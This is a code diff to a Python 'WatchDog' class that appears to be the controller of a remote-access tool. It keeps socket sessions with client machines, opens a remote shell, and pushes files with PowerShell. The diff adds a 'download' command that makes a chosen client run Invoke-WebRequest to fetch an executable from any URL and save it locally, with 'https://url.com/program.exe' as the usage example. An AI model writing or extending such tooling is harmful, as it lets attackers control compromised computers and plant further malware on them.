@@ -141,7 +141,7 @@ class WatchDog:
 
     def shell(self, client_number):
         try:
-            self.WatchDog_Input_Text = f"{colorama.Fore.RED}@Shell/{self.data_clients[client_number][2]}>{colorama.Fore.LIGHTBLUE_EX}"
+            self.WatchDog_Input_Text = f"{colorama.Fore.RED}@Shell\\{self.data_clients[client_number][2]}>{colorama.Fore.LIGHTBLUE_EX}"
 
             while True:
                 print(self.WatchDog_Input_Text, end='', flush=True)
@@ -187,6 +187,17 @@ class WatchDog:
             r.close()
 
             self.data_clients[client_n][0].send(bytes(f"""Set-Content -Path "{commands[3]}" -Value "{text}" """, "utf-8"))
+            self.data_clients[client_n][0].recv(16)
+
+        except Exception as e:
+            print(f"transfer error: {e}")
+
+    def download(self, commands):
+        client_n = int(commands[1])
+
+        try:
+            self.data_clients[client_n][0].settimeout(0.8)
+            self.data_clients[client_n][0].send(bytes(f"""Invoke-WebRequest '{commands[2]}' -OutFile {commands[3]} """, "utf-8"))
             self.data_clients[client_n][0].recv(16)
 
         except Exception as e:
@@ -242,6 +253,11 @@ class WatchDog:
                 print("transfer <client_number> <file/path/name.txt> <give name to file>")
                 print("")
                 print("")
+                print("")
+                print("download <client_number> <https://url.com/program.exe> <name.exe>")
+                print("")
+                print("")
+                print("")
             elif command[0] == "exit":
                 print("")
                 print("Closing Server...")
@@ -262,6 +278,8 @@ class WatchDog:
                         self.shell(int(command[1]))
             elif command[0] == "transfer":
                 self.transfer(command)
+            elif command[0] == "download":
+                self.download(command)
             elif command[0] == "sessions":
                 self.sessions()
 
